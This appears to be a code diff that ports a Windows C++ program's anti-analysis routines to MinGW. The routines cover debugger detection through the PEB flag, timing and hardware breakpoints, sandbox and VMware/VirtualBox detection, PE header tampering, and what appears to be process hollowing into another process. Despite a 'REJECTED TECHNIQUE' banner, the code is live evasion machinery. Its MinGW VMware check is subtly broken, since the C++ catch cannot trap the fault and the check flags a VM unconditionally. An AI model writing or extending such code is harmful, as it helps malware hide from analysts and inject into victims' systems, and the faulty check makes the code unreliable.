@@ -14,6 +14,7 @@
 #include <chrono>
 #include <map>
 #include <set>
+#include <ctime>
 
 #pragma comment(lib, "wininet.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -79,9 +80,16 @@ public:
         // Check 1: Multiple debugger detection methods
         debugger_present = IsDebuggerPresent();
         
-        // Check 2: PEB BeingDebugged flag
+        // Check 2: PEB BeingDebugged flag (MinGW compatible)
+        #ifdef _MSC_VER
         PPEB peb = (PPEB)__readfsdword(0x30);
         if (peb->BeingDebugged) debugger_present = true;
+        #else
+        // MinGW compatible PEB access
+        PPEB peb;
+        __asm__ volatile ("mov %%fs:0x30, %0" : "=r" (peb));
+        if (peb && peb->BeingDebugged) debugger_present = true;
+        #endif
         
         // Check 3: CheckRemoteDebuggerPresent
         BOOL remote_debugger = FALSE;
@@ -101,11 +109,15 @@ public:
         double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
         if (elapsed > 0.001) debugger_present = true; // Too slow = debugger
         
-        // Check 5: Hardware breakpoint detection
-        CONTEXT ctx = {};
+        // Check 5: Hardware breakpoint detection (MinGW compatible)
+        CONTEXT ctx;
+        ZeroMemory(&ctx, sizeof(ctx));
         ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-        GetThreadContext(GetCurrentThread(), &ctx);
-        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) debugger_present = true;
+        if (GetThreadContext(GetCurrentThread(), &ctx)) {
+            if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
+                debugger_present = true;
+            }
+        }
         
         // Check 6: Sandbox detection
         detectSandboxEnvironment();
@@ -170,12 +182,17 @@ public:
     // REJECTED TECHNIQUE: HYPERVISOR/VM DETECTION
     // ===============================================================================
     void detectVirtualMachine() {
-        // Check 1: CPUID hypervisor bit
+        // Check 1: CPUID hypervisor bit (MinGW compatible)
         int cpuInfo[4];
+        #ifdef _MSC_VER
         __cpuid(cpuInfo, 1);
+        #else
+        __asm__ volatile ("cpuid" : "=a" (cpuInfo[0]), "=b" (cpuInfo[1]), "=c" (cpuInfo[2]), "=d" (cpuInfo[3]) : "a" (1));
+        #endif
         if (cpuInfo[2] & (1 << 31)) vm_detected = true;
         
-        // Check 2: VMware artifacts
+        // Check 2: VMware artifacts (MinGW compatible)
+        #ifdef _MSC_VER
         __try {
             __asm {
                 push edx
@@ -197,6 +214,28 @@ public:
         __except(EXCEPTION_EXECUTE_HANDLER) {
             // Exception means no VMware
         }
+        #else
+        // MinGW compatible VMware detection
+        try {
+            __asm__ volatile (
+                "pushl %%edx\n\t"
+                "pushl %%ecx\n\t"
+                "pushl %%ebx\n\t"
+                "movl $0x564D5868, %%eax\n\t"
+                "movl $0, %%ebx\n\t"
+                "movl $10, %%ecx\n\t"
+                "movl $0x5658, %%edx\n\t"
+                "inl %%dx, %%eax\n\t"
+                "popl %%ebx\n\t"
+                "popl %%ecx\n\t"
+                "popl %%edx\n\t"
+                : : : "eax", "ebx", "ecx", "edx"
+            );
+            vm_detected = true;
+        } catch (...) {
+            // Exception means no VMware
+        }
+        #endif
         
         // Check 3: VirtualBox artifacts
         HKEY hKey;
@@ -261,11 +300,11 @@ public:
         if (nt_headers->Signature != IMAGE_NT_SIGNATURE) return false;
         
         // Technique 1: Randomize timestamp
-        nt_headers->FileHeader.TimeDateStamp = generateRandomTimestamp();
+        nt_headers->FileHeader.TimeDateStamp = static_cast<DWORD>(time(nullptr) + rng());
         
         // Technique 2: Modify characteristics
         nt_headers->FileHeader.Characteristics |= IMAGE_FILE_DEBUG_STRIPPED;
-        nt_headers->FileHeader.Characteristics &= ~IMAGE_FILE_LINE_NUMBERS_STRIPPED;
+        nt_headers->FileHeader.Characteristics &= ~IMAGE_FILE_LINE_NUMS_STRIPPED;
         
         // Technique 3: Alter entry point
         DWORD original_entry = nt_headers->OptionalHeader.AddressOfEntryPoint;
@@ -358,9 +397,9 @@ public:
         }
         
         // Allocate memory for our PE
-        IMAGE_DOS_HEADER* dos_header = reinterpret_cast<const IMAGE_DOS_HEADER*>(pe_data.data());
-        IMAGE_NT_HEADERS* nt_headers = reinterpret_cast<const IMAGE_NT_HEADERS*>(
-            pe_data.data() + dos_header->e_lfanew);
+        IMAGE_DOS_HEADER* dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(const_cast<uint8_t*>(pe_data.data()));
+        IMAGE_NT_HEADERS* nt_headers = reinterpret_cast<IMAGE_NT_HEADERS*>(
+            const_cast<uint8_t*>(pe_data.data()) + dos_header->e_lfanew);
         
         LPVOID base_address = VirtualAllocEx(pi.hProcess, 
             (LPVOID)nt_headers->OptionalHeader.ImageBase,
